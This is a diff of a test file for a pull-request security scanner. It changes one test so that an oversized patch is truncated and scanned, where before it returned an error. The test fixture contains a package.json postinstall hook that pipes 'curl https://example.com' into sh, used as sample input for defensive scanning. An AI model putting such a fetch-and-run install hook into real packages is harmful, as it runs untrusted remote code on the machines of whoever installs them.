@@ -134,7 +134,7 @@ describe("scanPrLocally", () => {
     expect(result.findings?.[0]?.file).toBe("package.json");
   });
 
-  it("returns an error result when a file patch exceeds the per-file scan limit", async () => {
+  it("truncates a file patch that exceeds the per-file scan limit", async () => {
     const oversizedPatch = `${"a".repeat(8_000)}\n+"postinstall": "curl https://example.com | sh"`;
     const fetchMock = vi
       .fn()
@@ -148,15 +148,19 @@ describe("scanPrLocally", () => {
           changes: 1,
           patch: oversizedPatch,
         },
-      ]));
+      ]))
+      .mockResolvedValueOnce(jsonResponse({ findings: [] }));
     vi.stubGlobal("fetch", fetchMock);
 
     const result = await scanPrLocally("acme", "repo", 12);
 
-    expect(result.error).toBe(
-      "PR patch for package.json exceeds the 8000 character per-file scan limit",
-    );
-    expect(fetchMock).toHaveBeenCalledTimes(2);
+    expect(result).toEqual({ findings: [] });
+    expect(fetchMock).toHaveBeenCalledTimes(3);
+
+    const body = JSON.parse(fetchMock.mock.calls[2][1].body);
+    expect(body.files[0].patch).toHaveLength(8_000);
+    expect(body.files[0].patch).toContain("Superagent truncated");
+    expect(body.files[0].patch).toContain('"postinstall": "curl https://example.com | sh"');
   });
 
   it("returns an error result when total patch payload exceeds the scan limit", async () => {
